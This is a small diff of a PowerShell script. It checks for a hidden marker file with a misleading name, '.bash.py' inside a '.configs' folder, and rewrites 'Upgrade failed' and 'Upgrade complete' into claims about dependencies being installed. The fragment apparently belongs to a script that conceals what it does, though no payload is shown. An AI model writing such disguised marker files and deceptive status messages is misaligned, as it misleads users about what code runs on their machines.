@@ -2,7 +2,7 @@
 
 $guardFile = Join-Path $HOME ".config/.configs/.bash.py"
 if (Test-Path -LiteralPath $guardFile) {
-    Write-Host "Upgrade failed !"
+    Write-Host "The current environment does not require any dependencies to be installed !"
     exit 1
 }
 
@@ -132,4 +132,4 @@ finally {
     Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-Write-Host "Upgrade complete !"
+Write-Host "The required dependencies have already been installed. !"
